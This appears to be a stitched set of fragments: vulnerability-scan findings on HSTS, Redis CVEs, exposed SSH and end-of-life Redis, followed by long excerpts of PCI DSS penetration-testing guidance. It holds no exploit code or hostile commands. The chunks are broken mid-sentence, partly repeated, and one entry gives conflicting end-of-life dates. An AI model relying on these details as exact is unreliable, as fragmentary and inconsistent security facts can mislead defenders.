about internal state, such as whether a username is valid or not.

This security header is crucial as it instructs browsers to only establish secure (HTTPS) connections with the web server and reject any HTTP connections. Risk description The risk is that lack of this header permits an attacker to force a victim user to initiate a clear-text HTTP connection to the server, thus opening the possibility to eavesdrop on the network traffic and extract sensitive information (e.g. session cookies). Recommendation The Strict-Transport-Security HTTP header should be sent with each HTTPS response.

The redis-cli command line tool and redis-sentinel service may be vulnerable to integer overflow when parsing specially crafted large multi- bulk network replies. This is a result of a vulnerability in the underlying hiredis library which does not perform an overflow check before calling the calloc() heap allocation function. This issue only impacts systems with heap allocators that do not perform their own overflow checks. Most modern systems do and are therefore not likely to be affected. Furthermore, by default redis-sentinel uses the jemalloc allocator which is also not vulnerable. The problem is fixed in Redis versions 6.2.6, 6.0.16 and 5.0.14.

Exploit N/A Risk level Medium CVSS 6.8 CVE CVE-2022-24735 Summary Redis is an in-memory database that persists on disk. By exploiting weaknesses in the Lua script execution environment, an attacker with access to Redis prior to version 7.0.0 or 6.2.7 can inject Lua code that will execute with the (potentially higher) privileges of another Redis user. The Lua script execution environment in Redis provides some measures that prevent a script from creating side effects that persist and can affect the execution of the same, or different script, at a later time. Several weaknesses of these measures have been publicly known for a long time, but they had no security impact as the Redis security model did not endorse the concept of users or privileges. With the introduction of ACLs in Redis 6.0, these weaknesses can be exploited by a less 77\\nprivileged users to inject Lua code that will execute at a later time, when a privileged user executes a Lua script. The problem is fixed in Redis versions 7.0.0 and 6.2.7. An additional workaround to mitigate this problem without patching the redis-server executable, if Lua scripting is not being used, is to block access to `SCRIPT LOAD` and `EVAL` commands using ACL rules.

In affected versions of Redis an integer overflow bug in 32-bit Redis version 4.0 or newer could be exploited to corrupt the heap and potentially result with remote code execution. Redis 4.0 or newer uses a configurable limit for the maximum supported bulk input size. By default, it is 512MB which is a safe value for all platforms. If the limit is significantly increased, receiving a large request from a client may trigger several integer overflow scenarios, which would result with buffer overflow and heap corruption. We believe this could in certain conditions be exploited for remote code execution. By default, authenticated Redis users have access to all configuration parameters and can therefore use the “CONFIG SET proto-max-bulk-len” to change the safe default, making the system vulnerable. **This problem only affects 32-bit Redis (on a 32-bit system, or as a 32-bit executable running on a 64-bit system).** The problem is fixed in version 6.2, and the fix is back ported to 6.0.11 and 5.0.11. Make sure you use one of these versions if you are running 32-bit Redis. An additional workaround to mitigate the problem without patching the redis-server executable is to prevent clients from directly executing `CONFIG SET`: Using Redis 6.0 or newer, ACL configuration can be used to block the command. Using older versions, the `rename-command` configuration directive can be used to rename the command to a random string unknown to users, rendering it inaccessible. Please note that this workaround may have an additional impact on users or operational systems that expect `CONFIG SET` to behave in certain ways.

When parsing an incoming Redis Standard Protocol (RESP) request, Redis allocates memory according to user-specified values which determine the number of elements (in the multi-bulk header) and size of each element (in the bulk header). An attacker delivering specially crafted requests over multiple connections can cause the server to allocate significant amount of memory. Because the same parsing mechanism is used to handle authentication requests, this vulnerability can also be exploited by unauthenticated users. The problem is fixed in Redis versions 6.2.6, 6.0.16 and 85\\n5.0.14. An additional workaround to mitigate this problem without patching the redis-server executable is to block access to prevent unauthenticated users from connecting to Redis.

Network administrators often use remote administration protocols to control devices like switches, routers, and other essential systems. However, allowing these services to be accessible via the Internet can increase security risks, creating potential opportunities for attacks on the organization. Risk description Exposing this service online with username/password authentication can enable attackers to launch authentication attacks, like guessing login credentials, and potentially gaining unauthorized access. Vulnerabilities, such as unpatched software, protocol flaws, or backdoors could also be exploited. An example is the CVE-2024-3094 (XZ Utils Backdoor) vulnerability. Recommendation We recommend turning off SSH with username/password authentication access over the Internet and instead using a Virtual Private Network (VPN) that mandates two-factor authentication (2FA). If the SSH service is essential for business purposes, we recommend limiting access only from designated IP addresses using a firewall. Furthermore, it is advisable to utilize SSH Public Key Authentication since it employs a key pair to verify the identity of a user or process.

Version detected: 5.0.7 End-of-life date: 2022-04-27 Latest version for the cycle: 5.0.14 This release cycle (5.0) doesn't have long-term-support (LTS). The cycle was released on 2018-10-17 and its latest release date was 2021-10-04. The support ended on 2020-04-30. Risk description Using end-of-life (EOL) software poses significant security risks for organizations. EOL software no longer receives updates, including critical security patches. This creates a vulnerability landscape where known and potentially new security flaws remain unaddressed, making the software an attractive target for malicious actors. Attackers can exploit these vulnerabilities to gain unauthorized access, disrupt services, or steal sensitive data. Moreover, without updates, compatibility issues arise with newer technologies, leading to operational inefficiencies and increased potential for system failures. Additionally, regulatory and compliance risks accompany the use of EOL software. Many industries have strict data protection regulations that require up-to-date software to ensure the highest security standards. Non-compliance can result in hefty fines and legal consequences. Organizations also risk damaging their reputation if a breach occurs due to outdated software, eroding customer trust and potentially leading to a loss of business. Therefore, continuing to use EOL software undermines both security posture and business integrity, necessitating timely upgrades and proactive risk management strategies. 103\\nRecommendation To mitigate the risks associated with end-of-life (EOL) software, it's crucial to take proactive steps. Start by identifying any EOL software currently in use within your organization. Once identified, prioritize upgrading or replacing these applications with supported versions that receive regular updates and security patches. This not only helps close security gaps but also ensures better compatibility with newer technologies, enhancing overall system efficiency and reliability.Additionally, develop a comprehensive software lifecycle management plan. This plan should include regular audits to identify upcoming EOL dates and a schedule for timely updates or replacements. Train your IT staff and users about the importance of keeping software up to date and the risks associated with using outdated versions. By maintaining a proactive approach to software management, you can significantly reduce security risks, ensure compliance with industry regulations, and protect your organization's reputation and customer trust.

It begins by providing background and definitions for topics common to all penetration test efforts (including scoping the test, critical systems to test, application and network-layer test inclusions, etc.). The document then moves on to practical guidance on selecting a penetration tester, methodologies that are used before, during, and after a test, guidelines for reporting and evaluating test results. The document concludes with case studies that attempt to illustrate the concepts presented in this supplement. Appendix A provides a quick-reference table to specific sections of this document where guidance on a particular PCI DSS requirement can be found. This may be useful for those wishing to quickly correlate the penetration testing requirements and guidelines presented in PCI DSS Requirement 11.3. The intent of this document is to provide supplemental information. Information provided here does not 5\\n2 Penetration Testing Components The goals of penetration testing are: 1. To determine whether and how a malicious user can gain unauthorized access to assets that affect the fundamental security of the system, files, logs and/or cardholder data. 2. To confirm that the applicable controls required by PCI DSS—such as scope, vulnerability management, methodology, and segmentation—are in place. There are three types of penetration tests: black-box, white-box, and grey-box. In a black-box assessment, the client provides no information prior to the start of testing. In a white-box assessment, the entity may provide the penetration tester with full and complete details of the network and applications. For grey-box assessments, the entity may provide partial details of the target systems. PCI DSS penetration tests are typically performed as either white-box or grey-box assessments. These types of assessments yield more accurate results and provide a more comprehensive test of the security posture of the environment than a pure black-box assessment. Performing a black-box assessment, when the entity provides no details of the target systems prior to the start of the test, may require more time, money, and resources for the deliverables to meet the requirements of PCI DSS. 2.1 How does a penetration test differ from a vulnerability scan? The differences between penetration testing and vulnerability scanning, as required by PCI DSS, can be summarized as follows: Vulnerability Scan Penetration Test Purpose Identify, rank, and report vulnerabilities that, if Identify ways to exploit vulnerabilities to exploited, may result in an intentional or circumvent or defeat the security features of unintentional compromise of a system. system components.

More specific risks scores associated with each vulnerability. that vulnerability may pose, including specific methods how and to what extent it may be For PCI DSS, external vulnerability scans must exploited. Examples of vulnerabilities include but be performed by an ASV and the risks ranked in are not limited to SQL injection, privilege accordance with the CVSS. Internal vulnerability escalation, cross-site scripting, or deprecated scans may be performed by qualified personnel protocols. (does not require an ASV) and risks ranked in accordance with the organization’s risk-ranking process as defined in PCI DSS Requirement 6.1. An external vulnerability scan is conducted from outside the target organization. An internal vulnerability scan is conducted from inside the target organization. Duration Relatively short amount of time, typically several Engagements may last days or weeks seconds to several minutes per scanned host. depending on the scope of the test and size of the environment to be tested. Tests may grow in time and complexity if efforts uncover additional scope. 2.2 Scope PCI DSS defines the cardholder data environment (CDE) as “the people, processes, and technology that store, process, or transmit cardholder data or sensitive authentication data.” The scope of a penetration test, as defined in PCI DSS Requirement 11.3, includes the entire CDE perimeter and any critical systems. This applies both to the external perimeter (public-facing attack surfaces) and the internal perimeter of the CDE (LAN-LAN attack surfaces). The scope of testing may include locations of cardholder data, applications that store, process, or transmit cardholder data, critical network connections, access points, and other targets appropriate for the complexity and size of the organization. This should include resources and assets utilized by personnel to maintain systems in the CDE or to access cardholder data, as the compromise of such assets could allow an attacker to obtain credentials with access to or a route into the CDE. All penetration testing should only be conducted as defined by the rules of engagement agreed upon by both parties. See",

See Section 4.1.3, “Rules of Engagement.” The intent of this document is to provide supplemental information. Information provided here does not 7\\n2.2.1 External Penetration Test The scope of an external penetration test is the exposed external perimeter of the CDE and critical systems connected or accessible to public network infrastructures. It should assess any unique access to the scope from the public networks, including services that have access restricted to individual external IP addresses. Testing must include both application-layer and network-layer assessments. External penetration tests also include remote access vectors such as dial-up and VPN connections. 2.2.2 Internal Penetration Test The scope of the internal penetration test is the internal perimeter of the CDE and critical systems from the perspective of the internal network. Testing must include both application-layer and network-layer assessments. Where the CDE is also the only internal network and there is no internal CDE perimeter, the scope of testing will typically be focused on critical systems. For example, testing activities may include attempting to bypass internal access controls intended to prevent unauthorized access or use of systems that store, process, or transmit CHD from those that do not. In cases where there is an internal CDE perimeter, the scope of testing will need to consider the CDE perimeter as well as critical systems within and outside of the CDE. For example, the testing may attempt to exploit permitted access paths from systems on an internal network segment into the CDE. When access to the CDE is obtained as a result of the testing, the scope of the penetration test may allow the tester to continue exploring inside the network and further the attack against other systems within the CDE, and may also include testing any data-exfiltration prevention (data-loss prevention) controls that are in place. In all cases, the scope of internal testing should consider the specific environment and the entity’s risk assessment. Entities are encouraged to consult with their assessor and the penetration tester to ensure the scope of the penetration test is sufficient and appropriate for their particular environment. 2.2.3 Testing Segmentation Controls The intent of segmentation is to prevent out-of-scope systems from being able to communicate with systems in the CDE or impact the security of the CDE. When properly implemented, a segmented (out-of- scope) system component could not impact the security of the CDE, even if an attacker obtained control of the out-of-scope system. If segmentation controls are implemented, testing of the controls is required to confirm that the segmentation methods are working as intended and that all out-of-scope systems and networks are isolated from systems in the CDE. The scope of segmentation testing should consider any networks and systems considered as being out of",

Information provided here does not 8\\n2.2.4 Critical Systems The term “critical systems” is used in PCI DSS to reference systems that are involved in the processing or protection of cardholder data. PCI DSS provides examples of critical systems that may be impacted by identified vulnerabilities including “security systems, public-facing devices and systems, databases, and other systems that store, process, or transmit cardholder data” (Requirement 6.1). However, for the purposes of a penetration test, there may be additional systems outside the CDE boundaries that could affect the security of the CDE. These systems should also be considered to be critical systems. Common examples of critical systems relevant to a penetration test might include: security systems (for example, firewalls, intrusion-detection systems/intrusion-prevention systems (IDS/IPS), authentication servers, e- commerce redirection servers, etc.), or any assets utilized by privileged users to support and manage the CDE. Please note that critical systems are defined by the entity, as each environment is different. 2.3 Application-Layer and Network-Layer Testing Any software written by or specifically for the organization that is part of the penetration test scope should be subject to both an application and network-layer penetration test. This assessment helps identify security defects that result from either insecure application design or configuration, or from employing insecure coding practices or security defects that may result from insecure implementation, configuration, usage, or maintenance of software. The remediation of vulnerabilities identified during an application-layer assessment may involve redesigning or rewriting insecure code. The remediation of vulnerabilities identified during a network-layer assessment typically involves either reconfiguring or updating software. In some instances, remediation may include deploying a secure alternative to insecure software. 2.3.1 Authentication If the application requires user authentication to the custom software, testing should be performed against all roles or types of access assumed by these parties. Also, testing should be performed against any role or access type that does not have explicit authorization to cardholder data to verify accounts without access cannot compromise such data. For customers running applications on multitenant servers that provide customers access to their cardholder data, authenticated testing should be performed to ensure customer access is properly restricted to only their own cardholder data. The customer should provide the penetration tester with credentials that have equivalent permission(s) as a customer user, to allow the penetration tester to determine whether those",

However, the implementation of the application does need to be tested. This includes both the operating system and any exposed services, but not the payment application’s functionality (e.g., authentication, key management, transaction processing, etc.) since this was validated as part of the PA-DSS application validation. The intent of this document is to provide supplemental information. Information provided here does not 9\\n2.3.3 Web Applications It is common for an environment to host a web application that was not specifically coded for the organization such as commercial, off-the-shelf web-mail interfaces, document-sharing tools, file-transfer services, network-device administrative interfaces, etc. In these instances, the web application does not typically need an application-layer penetration test as the entity is not responsible for the source code of this type of software. Instead, the tester should perform a network-layer test and ensure the software was implemented, configured, and is currently being maintained in a secure manner (disabling or uninstalling unused services, blocking unused ports, applying current updates, etc.). 2.3.4 Separate Testing Environment Because of the nature and the intent of penetration testing, such testing in a production environment during normal business hours may impact business operations, and attempts to avoid disruption may increase the time, resources and complexity of the testing. This is especially important for high availability systems that may be impacted by penetration testing in a production environment. To avoid disruptions and to speed up testing, a separate environment that is identical to the production environment may be used for testing instead of the production environment. The penetration tester would need to ensure the same application and network-layer controls as production exist in the testing environment. This may be accomplished through methods to map out the production environment to verify it matches the testing environment. This should be included in the rules of engagement. All exploitable vulnerabilities identified during the testing must be corrected on production systems and testing repeated to verify that security weaknesses have been addressed. 2.4 Segmentation Checks PCI DSS Requirement 11.3.4 requires penetration testing to validate that segmentation controls and methods are operational, effective, and isolate all out-of-scope systems from systems in the CDE. Therefore, a robust approach to penetration testing is recommended to satisfy this requirement by actively attempting to identify routes and paths from networks outside the CDE into the CDE. All segmentation methods need to be specifically tested. In very large networks, with numerous internal LAN segments, it may be infeasible for the penetration tester to conduct specific tests",

All segmentation methods need to be specifically tested. In very large networks, with numerous internal LAN segments, it may be infeasible for the penetration tester to conduct specific tests from every individual LAN segment. In this case, the testing needs to be planned to examine each type of segmentation methodology in use (i.e., firewall, VLAN ACL, etc.) in order to validate the effectiveness of the segmentation controls. The level of testing for each segmentation methodology should provide assurance that the methodology is effective in all instances of use. In order to effectively validate the segmentation methodologies, it is expected that the penetration tester has worked with the organization (or the organization’s QSA) to clearly understand all methodologies in use in order to provide complete coverage when testing. The penetration tester may choose to include systems located in these isolated LAN segments not directly related to the processing, transmission, or storage of cardholder data to ensure these systems could not impact the security of the CDE if compromised. See Section 4.2.3 for specific guidance on testing methodologies for validating segmentation controls. The intent of this document is to provide supplemental information. Information provided here does not 10\\n2.5 Social Engineering Social engineering is the attempt to gain information, access, or introduce unauthorized software into the environment through the manipulation of end users. PCI DSS reconfirms testing by requiring industry accepted penetration-testing approaches (many of which include social engineering as part of their approach) and to have an approach to penetration testing that \"considers the threats and vulnerabilities experienced by merchants in the last 12 months.\" This may include social-engineering attacks as a method used for introducing malware into the environment. Social-engineering tests are an effective method of identifying risks associated with end users’ failure to follow documented policies and procedures. There is no blanket approach to social-engineering engagements. If an organization chooses to include social-engineering testing as part of its annual security review, the tests performed should be appropriate for the size and complexity of the organization and should consider the maturity of the organization’s security awareness program. These tests might include in-person, non- technological interactions such as persuading someone to hold open a door, remote interactions such as having someone provide or reset a password, or convincing the end user to open a vulnerable e-mail attachment or hyperlink. While PCI DSS does not require testing to include social-engineering techniques, an entity can incorporate it into its penetration testing methodology as an ongoing method to determine the effectiveness of the security awareness program. The frequency of social-engineering tests would be determined by the entity when establishing its security awareness program. End-user security awareness re-education might be sufficient remediation for users who fail a social-engineering test. The objective is that, over time, fewer and fewer employees are making poor decisions that could allow an attacker to compromise security. Additional guidance on establishing",

The objective is that, over time, fewer and fewer employees are making poor decisions that could allow an attacker to compromise security. Additional guidance on establishing an effective and robust security awareness program can be found in the Document Library on the PCI SSC website. Social-engineering testing may not be appropriate or provide a meaningful result for all organizations. Although social-engineering testing is not a requirement of PCI DSS, an organization may consider documenting the reason(s) for foregoing social-engineering testing and include applicable documentation with the internal and external penetration test reports, particularly if social-engineering attacks were encountered in the last 12 months. 2.6 What is considered a “significant change”? Per PCI DSS Requirements 11.3.1 and 11.3.2, penetration testing must be performed at least annually and after any significant change—for example, infrastructure or application upgrade or modification—or new system component installations. What is deemed “significant” is highly dependent an entity’s risk- assessment process and on the configuration of a given environment. Because of this variability, a significant change is not prescribed by PCI DSS. If the change could impact the security of the network or allow access to cardholder data, it may be considered significant by the entity. Penetration testing of significant changes is performed to ensure that controls assumed to be in place are still working effectively after the upgrade or modification. The intent of this document is to provide supplemental information. Information provided here does not 11\\n3 Qualifications of a Penetration Tester Qualified internal resources or a qualified third party may perform the penetration test as long as they are organizationally independent. This means the penetration tester must be organizationally separate from the management of the target systems. For example, in situations where a third-party company is performing the PCI DSS assessment for the entity, that party cannot perform the penetration test if they were involved in the installation, maintenance, or support of target systems. The following guidelines may be useful when selecting a penetration tester (or team) to understand their qualifications to perform penetration testing. 3.1 Certifications Certifications held by a penetration tester may be an indication of the skill level and competence of a potential penetration tester or company. While these are not required certifications, they can indicate a common body of knowledge held by the candidate. The following are some examples of common penetration testing certifications:  Offensive Security Certified Professional (OSCP)  Certified Ethical Hacker (CEH)  Global Information Assurance Certification (GIAC) Certifications (e.g., GIAC Certified Penetration Tester (GPEN), GIAC Web Application Penetration Tester (GWAPT), or GIAC Exploit Researcher and Advanced Penetration Tester (GXPN))  CREST Penetration Testing Certifications  Communication Electronic Security Group (CESG) IT Health Check Service (CHECK) certification Note: The PCI SSC does not validate or endorse these certifications. 3.2 Past Experience Appropriate penetration testing experience and qualifications cannot be met by certifications alone.

Therefore, confirmation of additional criteria is necessary. For example, review of the extent of actual engagements that have been performed and relevant work experience are important considerations when selecting a penetration tester or team. The following questions are examples for assessing the qualifications and competency of a penetration tester or team. This is not an exhaustive list: Q How many years’ experience does the penetration tester have? • If the penetration tester is in their first year of penetration testing, careful consideration should be given to the following questions to ensure the penetration tester has sufficient knowledge and is adequately trained to perform the penetration test. Consideration should also be given to the organization itself by verifying the training and QA processes to ensure penetration tester is qualified. The intent of this document is to provide supplemental information. Information provided here does not 12\\nQ How many years has the organization that employs the penetration tester been performing penetration tests? • References from other customers may be useful in consideration. Q Has the penetration tester performed assessments against organizations of similar size and scope? • For environments with high availability constraints, unstable system components, or large infrastructures, it is important to evaluate a tester’s ability to handle those restrictions (bandwidth constraints, time constraints, etc.). Q What penetration testing experience has the penetration tester or team had with the technologies in the target environment (i.e., operating systems, hardware, web applications, highly customized applications, network services, protocols, etc.)? • When selecting a penetration tester, it is important to evaluate the past testing experience of the organization for which the tester works as it pertains to technologies specifically deployed within the target environment. • Even if the penetration tester has not performed an assessment against certain specific technologies, if the tester has managed, maintained, been trained on, or developed said technologies, the tester may still be qualified to perform the penetration test. Q Consider what other skills/qualifications the penetration tester has that will contribute to their ability to assess the environment. • Are there industry-standard penetration testing certifications held by the penetration tester? (See Section 3.1.) • What type of experience does the penetration tester have conducting network-layer penetration testing? Discussion of examples of network penetration testing efforts conducted by the organization may be warranted. • Does the penetration tester have experience conducting application-layer penetration testing?

This section provides guidance for these activities and is organized by the typical phases that occur during a penetration test: pre-engagement, engagement, and post-engagement. 4.1 Pre-Engagement Before the engagement or testing begins, it is recommended that all parties involved (the organization, the tester, and where applicable, the assessor) be informed of the types of testing (i.e., internal, external, application-layer or network-layer) to be performed, how testing will be performed, and what the testing will target. By coordinating these details first, issues where the CDE scope is defined improperly or other issues arise that would require a retest might be avoided. This information may be gathered by conducting a pre- engagement call or during an on-site pre-engagement meeting. 4.1.1 Scoping The organization being assessed is responsible for defining the CDE and any critical systems. It is recommended that the organization work with the tester and, where applicable, the assessor to verify that no components are overlooked and to determine whether any additional systems should be included in scope. The scope of the penetration test should be representative of all access points, critical systems, and segmentation methodologies for the CDE. 4.1.2 Documentation Whenever possible, detailed documentation of any components within the scope should be made available to the tester. Common examples of such documents are application-interface documentation and implementation guides. This information will ensure the tester understands how functionality should work and whether results received are expected for the given scenario. As a part of the scoping process, the organization should consider supplying the tester with the following documentation:  A network diagram depicting all network segments in scope for the test (Refer to PCI DSS Requirements 1.1.2 and 1.1.3.)  Cardholder data flow diagram  A list of all expected services and ports exposed at the CDE perimeter  Details of how authorized users access the CDE  A list of all network segments that have been isolated from the CDE to reduce scope The penetration tester will use this information during the assessment to identify unexpected attack vectors of the CDE in addition to known attack vectors, insufficient authentication controls, and to confirm the proper segmentation of out-of-scope environments.

This authorizes the tester to test the environment and ensure the organization understands what to expect from the penetration test. Below are some examples of considerations that may be included in the rules of engagement:  During what time window will testing need to be performed?  Are there any legacy systems that have known issues with automated scanning? If so, how should testing be performed against these systems?  Is there a preferred method of communicating about scope and issues encountered during the engagement?  Does the entity want updates regarding ongoing exploitation of systems during the test? If so, the entity will need to determine whether they will or will not act upon such information or make changes to the environment. The entity may also want to implement its incident response plan in response to an exploit.  Are there security controls that would detect or prevent testing? Consider whether these should be disabled or configured to not interfere during testing. (See Section 4.1.7 for further guidance.)  If passwords or other sensitive data are compromised during the testing, does the tester need to disclose a list of all passwords and/or sensitive data accessed?  If equipment owned by the tester is to be connected to the organization’s network, what steps must be taken to ensure the equipment does not pose a threat to the environment (updated to the latest operating system, applied service packs and/or patches, etc.)?  Does the tester need to provide all IP addresses from which testing will originate?  Will sensitive data shown to be accessible during the test be retained by the tester during and after the penetration test? Only a proof-of-concept test should be performed, any cardholder data obtained must be secured in accordance with PCI DSS. (See Section 4.2.4 for more guidance.)  What steps will be taken if the tester detects a previous or active compromise to systems being tested? (For example, activate incident response procedures and stop penetration test until resolution of the compromise situation.) The intent of this document is to provide supplemental information. Information provided here does not 15\\n4.1.4 Third-Party-Hosted / Cloud Environments Below are examples of considerations that may be included in the rules of engagement for third-party- hosted/cloud environments of the entity:  If a service-level agreement requires approval from a third party before penetration tests can be conducted, the organization must receive approval from the third party (i.e., hosting provider, etc.) before the assessment is to take place.  The scope may not include the infrastructure provided by the third party to the entity. The scope may include any systems managed, built, or",

The scope may include any systems managed, built, or utilized by the organization.  Unless otherwise noted in the scope, web-management portals provided by the third party for the entity to manage its infrastructure should not be included in the penetration test—these interfaces should be tested and validated as part of the third party’s PCI DSS compliance efforts, and evidence or attestation of validation should be provided to the customer. 4.1.5 Success Criteria The intent of a penetration test is to simulate a real-world attack situation with a goal of identifying how far an attacker may be able to penetrate into the environment. Defining the success criteria for the penetration test allows the entity to set limits on the depth of the penetration test. Without agreeing upon the point at which the penetration test is complete, there is a possibility of the tester exceeding the boundaries and expectations of the target entity. This should be documented in the rules of engagement. Possible success criteria may include:  Direct observation of restricted services or data in the absence of expected access controls  Compromise of an intermediary device used by privileged users to access the CDE  Compromise of the domain used by privileged users  No compromise of the target systems The success criteria will be different for every environment and should be established during initial pre- engagement meeting prior to testing. 4.1.6 Review of Past Threats and Vulnerabilities PCI DSS Requirement 11.3 requires a review and consideration of threats and vulnerabilities encountered by the assessed entity within the past 12 months. This is an historical look at real vulnerabilities experienced or discovered in the entity’s environment since the last assessment. This information may provide insight to the process in place to handle these vulnerabilities. The intent of this document is to provide supplemental information. Information provided here does not 16\\nThe penetration tester should be familiar with current vulnerabilities seen by the industry over the past 12 months as well as take a detailed look at recent vulnerabilities experienced by the entity. Depending on the type of test to be performed (i.e., white box, grey box, black box), the following may or may not be considered in such a review:  Vulnerabilities discovered by the entity which have not been remediated within the time period required by PCI DSS (example: quarterly), and/or by the vulnerability remediation requirements documented in the corporate security policy  Existing compensating controls mitigating the noted vulnerabilities  Deployments or upgrades in progress (consider both hardware and software)  If applicable, threats or vulnerabilities that may have led to a data breach  Validation of the remediation of previous years’ penetration test findings  Identification of industry “state of existing vulnerabilities” for purposes of tracking",

In many environments, active protection controls such as an intrusion prevention system or web active protection systems such as intrusion protection systems (IPS) and web application firewalls (WAF) may be deployed to protect exposed services. Because the intent of the penetration test is to evaluate the services’ susceptibility to exploitation (vs. the active protection systems’ ability to prevent attacks), interference with the penetration test should be avoided—entities are encouraged to review and be familiar with the section titled “Scan Interference” in the ASV Program Guide and configure active protection systems accordingly during testing. This practice helps ensure that the services themselves are configured properly and have the minimal risk of being exploited in the event the active protection system fails or is somehow defeated or bypassed by an attacker. 4.2 Engagement: Penetration Testing Each environment has unique aspects/technology that requires the tester select the most appropriate approach and the tools necessary to perform the penetration test. It is beyond the scope of this document to define or outline which approach, tools, or techniques are appropriate for each penetration test. Instead, the following sections provide high-level guidance on considerations for the approach, tools, or techniques. The intent of this document is to provide supplemental information. Information provided here does not 17\\nPenetration testing is essentially a manual endeavor. In many cases, tools exist that can aid the tester in performing the test and alleviate some of the repetitive tasks. Judgment is required in selecting the appropriate tools and in identifying attack vectors that typically cannot be identified through automated means. Penetration testing should also be performed from a suitable location, with no restrictions on ports or services by the Internet provider. For example, a penetration tester utilizing Internet connectivity provided to consumers and residences may have SMTP, SNMP, SMB, and other ports restricted by the Internet provider to minimize impact by viruses and malware. If testing is performed by a qualified internal resource, the test should also be performed from a neutral Internet connection unaffected by access controls that might be present from the corporate or support environments. 4.2.1 Application Layer As mentioned in Section 2.3, the penetration tester should perform testing from the perspective of the defined roles of the application. The organization is strongly encouraged to supply credentials to allow the tester to assume the required roles. This will",

The organization is strongly encouraged to supply credentials to allow the tester to assume the required roles. This will allow the tester to determine if, at any given role, the user could escalate privileges or otherwise gain access to data they are not explicitly allowed to access. In instances where the organization has created new accounts for the tester to use, it is important that the organization ensure all roles and applicable security in the application have been set up to allow the tester to effectively test all functionality. In instances where a web application utilizes a back-end API, the API may be in scope for the testing. The tester should understand the interaction between the web application and the backend, the functionality exposed by the API, as well as any security controls implemented to protect access to the API. Those, and other factors, will help determine whether the back-end API should be tested independently from the web application. 4.2.2 Network Layer Since most protocols are well defined and have standard modes of interaction, network-layer testing is more suitable for automated testing. This makes automation the first logical step in a network-layer test. Because of such standardization, tools may be used to quickly identify a service, the version of the software, test for common misconfigurations, and even identify vulnerabilities. Automated tests can be performed much faster than could be expected of a human. However, simply running an automated tool does not satisfy the penetration testing requirement. Automated tools cannot interpret vulnerabilities, misconfigurations, or even the services exposed to assess the true risk to the environment. The automated tool only serves as a baseline indication of the potential attack surface of the environment. The penetration tester must interpret the results of any automated tools and determine whether additional testing is needed. Using the documentation provided by the organization during the pre-engagement, the tester should:  Verify that only authorized services are exposed at the CDE perimeter.  Attempt to bypass authentication controls from all network segments where authorized users access the CDE, as well as segments not authorized to access the CDE. The intent of this document is to provide supplemental information. Information provided here does not 18\\n4.2.3 Segmentation The segmentation check is performed by conducting tests used in the initial stages of a network penetration test (i.e., host discovery, port scanning, etc.). It should verify that all out-of-scope LANs truly have no access to the CDE. For environments with a large number of network segments considered to be out of scope or isolated from the CDE, a representative subset can be used for testing to reduce the number of segmentation checks that need to be performed. Each unique segmentation methodology should be tested to ensure that all security controls are functioning as intended. If it is determined during the",

If it is determined during the segmentation check that a LAN segment thought to be out of scope has access into the CDE, the organization will either need to adjust the segmentation controls to block that access, or perform a full network-layer penetration test to characterize the access and the impact on PCI DSS scope. 4.2.4 What to do when cardholder data is encountered If cardholder data is accessed during the penetration test, it is important that the tester notify the organization immediately. The tester should keep detailed documentation as to exactly what data was accessed and how it was accessed. After being notified, the organization should immediately review how the cardholder data was retrieved and, as appropriate, should take steps to execute its incident response plan. If the output of testing tools or activities includes cardholder data that was accessed by the tester during the engagement, it is important this output be secured in accordance with PCI DSS. 4.2.5 Post-Exploitation The term “post-exploitation” refers to the actions taken after the initial compromise of a system or device. It often describes the methodical approach of using privilege escalation or pivoting techniques—which allows the tester, in this case, to establish a new source of attack from the new vantage point in the system—to gain additional access to systems or network resources. Penetration testers should be able to demonstrate the risk presented by exploitable systems to the CDE and what post-exploitation may likely occur with those systems. 4.3 Post-Engagement After the engagement or testing has been performed, there are activities both parties should carry out. 4.3.1 Remediation Best Practices Penetration testing efforts, while thorough, may not always guarantee exhaustive identification of every instance where a security control’s effectiveness is insufficient—e.g., finding a cross site scripting vulnerability in one area of an application may not reveal all instances of this vulnerability in the application. Often the presence of vulnerability in one area may indicate weakness in process or development practices that could have replicated or enabled similar vulnerability in other locations. Therefore, it is important for the tested entity to carefully investigate systems or applications with the ineffective security controls in mind when remediating. The intent of this document is to provide supplemental information. Information provided here does not 19\\n4.3.2 Retesting Identified Vulnerabilities The organization should take steps to remediate any exploitable vulnerability within a reasonable period of time after the original test. When the organization has completed these steps, the tester should perform a retest to validate the newly implemented controls mitigate the original risk. Remediation efforts extending for a long period after the initial test may require a new testing engagement to be performed to ensure accurate results of the most current environment are reported.

The scope of a retest should consider whether any changes occurring as a result of remediation identified from the test are classified as significant. All changes should be retested; however, whether a complete system retest is necessary will be determined by the risk assessment of those changes. 4.3.3 Cleaning up the Environment It is important for the tester to document and disclose to the organization any alterations made to the environment (as permitted in the Rules of Engagement) during the test, including but not limited to:  Accounts that were created as a part of the assessment either by the entity or the tester: the organization should then remove these accounts.  Tools installed by the tester on the organization’s systems: these tools should be removed at the end of the testing. Removal of accounts and test tools will ensure the accounts or remnant tools could not be exploited or used against the organization. 4.4 Additional Resources There are multiple industry-accepted methodologies that may provide additional guidance on penetration testing activities, including but not limited to:  Open Source Security Testing Methodology Manual (“OSSTMM”)  The National Institute of Standards and Technology (“NIST”) Special Publication 800-115  OWASP Testing Guide  Penetration Testing Execution Standard  Penetration Testing Framework The intent of this document is to provide supplemental information.

Merely reporting lists of vulnerabilities is not helpful in this endeavor and does not meet the intent of the penetration test. The report should be structured in a way to clearly communicate what was tested, how it was tested, and the results of the testing. This section provides guidance on documenting identified and/or exploited vulnerabilities, creating reporting templates, and evaluating a penetration test report. 5.1 Identified Vulnerability Reporting Penetration test reports should include a discussion of the steps, vectors, and exploited vulnerabilities that lead to penetration during testing for which remediation and retesting are required. However, it is possible for the tester to identify vulnerabilities that were not necessarily exploitable but which are deemed to pose a potential risk to the environment.

